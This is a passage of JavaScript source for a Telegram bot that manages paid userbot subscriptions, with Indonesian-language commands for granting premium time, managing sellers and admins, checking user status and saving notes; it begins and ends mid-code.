                    if (repliedMsg.senderId) {
                        return repliedMsg.senderId.toString();
                    }
                    if (repliedMsg.sender && repliedMsg.sender.id) {
                        return repliedMsg.sender.id.toString();
                    }
                    if (repliedMsg.fromId) {
                        return repliedMsg.fromId.toString();
                    }
                    if (repliedMsg.peerId && repliedMsg.peerId.userId) {
                        return repliedMsg.peerId.userId.toString();
                    }
                }
            } catch (replyError) {
                console.error("Error getting reply message:", replyError);
            }
        }
        
        const args = text.split(' ').filter(arg => arg.trim());
        
        if (args && args.length >= 2) {
            const target = args[1].trim();
            
            if (/^\d+$/.test(target)) {
                return target;
            }
            
            if (target.startsWith('@')) {
                const username = target.substring(1);
                try {
                    if (msg.entities) {
                        for (const entity of msg.entities) {
                            if (entity.type === 'mention' || entity.type === 'textMention') {
                                if (entity.userId) {
                                    return entity.userId.toString();
                                }
                            }
                        }
                    }
                    
                    const user = await client.getEntity(username);
                    if (user && user.id) {
                        return user.id.toString();
                    }
                } catch (err) {
                    console.error("Error getting user from username:", err);
                }
            }
            
            const mentionMatch = text.match(/@(\w+)/);
            if (mentionMatch && mentionMatch[1]) {
                try {
                    const user = await client.getEntity(mentionMatch[1]);
                    if (user && user.id) {
                        return user.id.toString();
                    }
                } catch (err) {
                    console.error("Error getting user from mention:", err);
                }
            }
            
            const linkMatch = text.match(/t\.me\/(\w+)/);
            if (linkMatch && linkMatch[1]) {
                try {
                    const user = await client.getEntity(linkMatch[1]);
                    if (user && user.id) {
                        return user.id.toString();
                    }
                } catch (err) {
                    console.error("Error getting user from link:", err);
                }
            }
            
            return null;
        }
        
        if (msg.entities) {
            for (const entity of msg.entities) {
                if (entity.type === 'textMention' && entity.userId) {
                    return entity.userId.toString();
                }
            }
        }
        
        if (requireTarget) {
            return null;
        }
        
        if (msg.senderId) {
            return msg.senderId.toString();
        }
        
        if (msg.sender && msg.sender.id) {
            return msg.sender.id.toString();
        }
        
        if (msg.fromId) {
            return msg.fromId.toString();
        }
        
        if (msg.peerId && msg.peerId.userId) {
            return msg.peerId.userId.toString();
        }
        
        return null;
        
    } catch (error) {
        console.error("Error in getUserIdFromMessage:", error);
        return null;
    }
}

if (msg.text?.startsWith(`${prefix}prem`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserSeller(userId) && !isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya seller yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            const args = msg.text.split(' ').filter(arg => arg.trim());
            
            if (args.length < 2 && !msg.replyTo) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}prem @username [durasi]</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ User tidak ditemukan! Gunakan @username atau id_user</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let months = 1;
            // Cari angka dari semua args (skip .prem dan @username)
            // Handles: reply+angka, @username+angka, angka langsung
            for (let i = 1; i < args.length; i++) {
                const parsed = parseInt(args[i]);
                if (!isNaN(parsed) && parsed > 0 && !args[i].startsWith('@')) {
                    months = parsed;
                    break;
                }
            }
            
            if (months < 1) months = 1;
            // Tidak ada batas maksimum bulan
            
            const now = new Date();
            // Fix: pakai cara aman supaya durasi bulan tepat (misal .prem 2 = +2 bulan, .prem 10 = +10 bulan)
            const expiredDate = new Date(now.getFullYear(), now.getMonth() + months, now.getDate(), now.getHours(), now.getMinutes(), now.getSeconds());
            
            premiumUsers.set(targetUserId, {
                expired: expiredDate,
                added_by: userId,
                added_at: now,
                months: months
            });
            
            await savePremiumData();
            
            const formattedDate = expiredDate.toLocaleDateString('id-ID', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            });
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴇxᴘɪʀᴇᴅ: ${months} ʙᴜʟᴀɴ</b>
<b>ꜱɪʟᴀʜᴋᴀɴ ʙᴜᴋᴀ @${usernameBot} ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>

<blockquote>ᴄᴀʀᴀ ʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ :
- sɪʟᴀʜᴋᴀɴ /start ᴅᴜʟᴜ ʙᴏᴛ @${usernameBot} 
- ᴋᴀʟᴀᴜ sᴜᴅᴀʜ sᴛᴀʀᴛ ʙᴏᴛ ᴀʙɪsᴛᴜ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ 
- ɴᴀʜ ɴᴀɴᴛɪ ᴀᴅᴀ ᴀʀᴀʜᴀɴ ᴅᴀʀɪ ʙᴏᴛ ɴʏᴀ ɪᴛᴜ ɪᴋᴜᴛɪɴ</blockquote>
<blockquote><b>ɴᴏᴛᴇ : ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ʙᴀᴄᴀ ᴀʀᴀʜᴀɴ ᴅᴀʀɪ ʙᴏᴛ ɴʏᴀ</b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
            if (!isUserOwner(userId)) {
                try {
                    if (config.OWNER_BOT && config.ownerId) {
                        const axios = require('axios');
                        
                        await axios.post(`https://api.telegram.org/bot${config.OWNER_BOT}/sendMessage`, {
                            chat_id: config.ownerId,
                            text: `📊 TRANSAKSI PREMIUM\n\n• Seller: ${userId}\n• Customer: ${targetUserId}\n• Durasi: ${months} bulan\n• Expired: ${formattedDate}`,
                            parse_mode: "HTML"
                        }).catch(axiosErr => {
                            console.error("Error sending Telegram notification:", axiosErr.message);
                            
                            if (config.OWNER_ID) {
                                client.sendMessage(config.OWNER_ID, {
                                    message: `<blockquote>📊 TRANSAKSI PREMIUM\n\n• Seller: ${userId}\n• Customer: ${targetUserId}\n• Durasi: ${months} bulan\n• Expired: ${formattedDate}</blockquote>`,
                                    parseMode: "html"
                                }).catch(clientErr => {
                                    console.error("Fallback notification also failed:", clientErr.message);
                                });
                            }
                        });
                    }
                    else if (typeof OWNER_ID !== 'undefined' && OWNER_ID) {
                        await client.sendMessage(OWNER_ID, {
                            message: `<blockquote>📊 TRANSAKSI PREMIUM\n\n• Seller: ${userId}\n• Customer: ${targetUserId}\n• Durasi: ${months} bulan\n• Expired: ${formattedDate}</blockquote>`,
                            parseMode: "html"
                        }).catch(clientErr => {
                            console.error("Error sending notification to owner:", clientErr.message);
                        });
                    }
                    
                } catch (notifErr) {
                    console.error("General error in notification system:", notifErr.message);
                }
            }
            
        } catch (error) {
            console.error("Error in .prem command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unprem`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserSeller(userId) && !isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya seller yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}unprem @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            const premiumData = getPremiumInfo(targetUserId);
            if (!premiumData) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ User tidak memiliki premium!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            premiumUsers.delete(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴋᴇᴛᴇʀᴀɴɢᴀɴ: ᴛᴇʟᴀʜ ᴅɪ ʜᴀᴘᴜꜱ ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀꜱᴇ</ci></b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .unprem command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}getprem`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserSeller(userId) && !isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya seller yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (premiumUsers.size === 0) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>📭 Tidak ada user premium!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let text = "<blockquote>📋 DAFTAR USER PREMIUM\n\n";
            let count = 1;
            const now = new Date();
            
            const sortedUsers = Array.from(premiumUsers.entries())
                .sort((a, b) => a[1].expired - b[1].expired);
            
            for (const [userId, data] of sortedUsers) {
                const premiumInfo = getPremiumInfo(userId);
                if (!premiumInfo) continue;
                
                const expiredDate = data.expired;
                const formattedDate = expiredDate.toLocaleDateString('id-ID');
                
                text += `${count}. ID: <code>${userId}</code>\n`;
                
                if (premiumInfo.daysLeft > 0) {
                    text += `   ⏳ Expired: ${formattedDate} (${premiumInfo.daysLeft} hari lagi)\n`;
                } else {
                    text += `   ⚠️ Expired: ${formattedDate} (KADALUARSA)\n`;
                }
                
                text += `   🆔 Seller: <code>${data.added_by || 'System'}</code>\n\n`;
                count++;
            }
            
            text += `📊 Total: ${premiumUsers.size} user</blockquote>`;
            
            await client.sendMessage(msg.chatId, {
                message: text,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .getprem command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}selles`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}selles @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (isUserSeller(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴋᴇᴛᴇʀᴀɴɢᴀɴ: ꜱᴜᴅᴀʜ ʀᴇꜱᴇʟʟᴇʀ</ci></b></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            sellerUsers.add(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴋᴇᴛᴇʀᴀɴɢᴀɴ: ʀᴇꜱᴇʟʟᴇʀ</ci></b>
<b>ꜱɪʟᴀʜᴋᴀɴ ʙᴜᴋᴀ @${usernameBot}</b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .selles command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unselles`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}unselles @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (!isUserSeller(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴋᴇᴛᴇʀᴀɴɢᴀɴ: ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴀꜰᴛᴀʀ</ci></b></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            sellerUsers.delete(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>
<b>ɪᴅ: ${targetUserId}</b>
<b>ᴋᴇᴛᴇʀᴀɴɢᴀɴ: ᴛᴇʟᴀʜ ᴅɪ ʜᴀᴘᴜꜱ ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀꜱᴇ</ci></b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .unselles command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}getseller`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (sellerUsers.size === 0) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>📭 Tidak ada seller!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let text = "<blockquote>📋 DAFTAR SELLER\n\n";
            let count = 1;
            
            const sortedSellers = Array.from(sellerUsers).sort();
            
            for (const sellerId of sortedSellers) {
                text += `${count}. ID: <code>${sellerId}</code>\n`;
                count++;
            }
            
            text += `\n📊 Total: ${sellerUsers.size} seller</blockquote>`;
            
            await client.sendMessage(msg.chatId, {
                message: text,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .getseller command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}cek`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            const isAuthorized = isUserOwner(userId) || isUserSeller(userId) || isUserAdmin(userId);
            if (!isAuthorized) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Akses ditolak!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text, false);
            if (!targetUserId) targetUserId = userId;
            
            const premiumInfo = getPremiumInfo(targetUserId);
            const isPremium = premiumInfo !== null;
            const isSeller = isUserSeller(targetUserId);
            const isAdmin = isUserAdmin(targetUserId);
            const isUltra = isUserUltra(targetUserId);
            
            let statusText = "";
            let expiredText = "❌ Tidak ada";
            
            if (isPremium) {
                const daysLeft = premiumInfo.daysLeft;
                const expiredDate = premiumInfo.expired.toLocaleDateString('id-ID');
                
                statusText = "✅ Premium";
                expiredText = `${expiredDate} (${daysLeft > 0 ? daysLeft + ' hari lagi' : 'EXPIRED'})`;
            } else {
                statusText = "❌ Non Premium";
            }
            
            if (isUltra) {
                statusText = "🌟 Super Ultra";
            }
            
            if (isSeller) {
                statusText += " + Seller";
            }
            
            if (isAdmin) {
                statusText += " + Admin";
            }
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>📋 INFO USER

👤 User ID: <code>${targetUserId}</code>
📊 Status: ${statusText}
⏳ Expired: ${expiredText}
📅 Checked: <code>${userId}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .cek command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}addadmin`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}addadmin @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (isUserAdmin(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>💬 INFORMATION
id: ${targetUserId}
keterangan: sudah dalam daftar</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            adminUsers.add(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>💬 INFORMATION
id: ${targetUserId}
keterangan: admin
</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .addadmin command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unadmin`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}unadmin @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (!isUserAdmin(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>💬 INFORMATION
id: ${targetUserId}
keterangan: tidak daam daftar</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            adminUsers.delete(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>💬 INFORMATION
id: ${targetUserId}
keterangan: unadmin</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .unadmin command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}getadmin`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (adminUsers.size === 0) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>📭 Tidak ada admin!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let text = "<blockquote>📋 DAFTAR ADMIN\n\n";
            let count = 1;
            
            const sortedAdmins = Array.from(adminUsers).sort();
            
            for (const adminId of sortedAdmins) {
                text += `${count}. ID: <code>${adminId}</code>\n`;
                count++;
            }
            
            text += `\n📊 Total: ${adminUsers.size} admin</blockquote>`;
            
            await client.sendMessage(msg.chatId, {
                message: text,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .getadmin command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}addultra`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}addultra @username\nAtau id_user</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (isUserUltra(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❗️ sudah menjadi superultra!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            ultraPremiumUsers.add(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>user: <code>${targetUserId}</code>berhasil menjadi superultra</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .addultra command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}rmultra`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Format: .rmultra @username\nAtau id_user</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            if (!isUserUltra(targetUserId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>tidak ada di dalam database superultra</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            ultraPremiumUsers.delete(targetUserId);
            await savePremiumData();
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>user: <code>${targetUserId}</code> berhasil di hapus dari daftar superultra</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .rmultra command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}time`)) {
    (async () => {
        try {
            const userId = msg.senderId ? msg.senderId.toString() : null;
            if (!userId) return;
            
            if (!isUserOwner(userId)) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Hanya owner yang dapat menggunakan command ini!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            const args = msg.text.split(' ').filter(arg => arg.trim());
            
            if (args.length < 2 && !msg.replyTo) {
                return await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ Format: ${prefix}time @username hari\nContoh: .time @username 30</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let targetUserId = await getUserIdFromMessage(msg, msg.text);
            if (!targetUserId) {
                return await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ User tidak ditemukan!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            let days = 30; 
            if (args.length >= 3) {
                days = parseInt(args[2]) || 30;
            } else if (args.length >= 2 && !msg.replyTo) {
                if (!args[1].startsWith('@')) {
                    days = parseInt(args[1]) || 30;
                }
            }
            
            if (days < 1) days = 1;
            if (days > 3650) days = 3650;
            
            const now = new Date();
            const expiredDate = new Date(now);
            expiredDate.setDate(now.getDate() + days);
            
            const existingData = premiumUsers.get(targetUserId) || {};
            premiumUsers.set(targetUserId, {
                ...existingData,
                expired: expiredDate,
                added_by: userId,
                added_at: now,
                days: days
            });
            
            await savePremiumData();
            
            const formattedDate = expiredDate.toLocaleDateString('id-ID', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            });
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>
user: <code>${targetUserId}</code>
durasi: ${days} hari
expired: ${formattedDate}
</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (error) {
            console.error("Error in .time command:", error);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ Terjadi kesalahan sistem!</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .addnote
       if(msg.text?.startsWith(`${prefix}addnote`)) {
    const userId = msg.senderId.toString();
    const args = msg.text.split(" ").slice(1);
    const userNotes = getUserNotes(userId);
    const name = args.shift()?.toLowerCase();
    const text = args.join(" ");
    
    const replyMsg = msg.replyMessage || 
                     msg.replyToMessage || 
                     (await msg.getReplyMessage?.());

    if (!name) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}addnote (nama) [teks atau reply media]</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
      return;
    }

      if (replyMsg) {
      const isImage = replyMsg.photo || 
                     replyMsg.media?.photo || 
                     (replyMsg.document && /image\//i.test(replyMsg.document.mimeType));
      
      if (isImage) {
        try {
          const caption = replyMsg.text || 
                         replyMsg.message || 
                         replyMsg.caption || 
                         text || 
                         "(ᴛᴀɴᴘᴀ ᴄᴀᴘᴛɪᴏɴ)";
          
          const mediaToDownload = replyMsg.media || 
                                 replyMsg.photo || 
                                 replyMsg.document || 
                                 replyMsg;
          
          const buffer = await client.downloadMedia(mediaToDownload);
          const filePath = path.join(DATA_DIR, `note_${userId}_${name}_${Date.now()}.jpg`);
          fs.writeFileSync(filePath, buffer);

          userNotes[name] = {
            type: "photo",
            path: filePath,
            caption,
            createdAt: Date.now()
          };
          saveUserNotes(userId, userNotes);

          await client.sendMessage(msg.chatId, {
            message: `<blockquote>✅ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        } catch (err) {
          console.error("Error saving photo note:", err);
          await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴʏɪᴍᴘᴀɴ ғᴏᴛᴏ: ${err.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        }
        return;
      } else if (replyMsg.text || replyMsg.message) {
        try {
          const noteContent = replyMsg.text || replyMsg.message || text;
          
          userNotes[name] = { 
            type: "text", 
            content: noteContent, 
            createdAt: Date.now() 
          };
          saveUserNotes(userId, userNotes);

          await client.sendMessage(msg.chatId, {
            message: `<blockquote>✅ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        } catch (err) {
          console.error("Error saving text note:", err);
          await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴʏɪᴍᴘᴀɴ ᴛᴇᴋs: ${err.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        }
        return;
      }
    }

    if (!text) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>⚠️ ʙᴀʟᴀs ᴘᴇsᴀɴ ᴀᴛᴀᴜ ʙᴇʀɪ ᴛᴇᴋs ᴜɴᴛᴜᴋ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
      return;
    }

    userNotes[name] = { 
      type: "text", 
      content: text, 
      createdAt: Date.now() 
    };
    saveUserNotes(userId, userNotes);

    await client.sendMessage(msg.chatId, {
      message: `<blockquote>✅ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
}

if(msg.text?.startsWith(`${prefix}getnote`)) {
  const userId = msg.senderId.toString();
  const args = msg.text.split(" ").slice(1);
  const userNotes = getUserNotes(userId);
  const name = args[0]?.toLowerCase();

  if (!name) {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}getnote <nama></blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }

  const note = userNotes[name];
  if (!note) {
    await client.sendMessage(msg.chatId, {
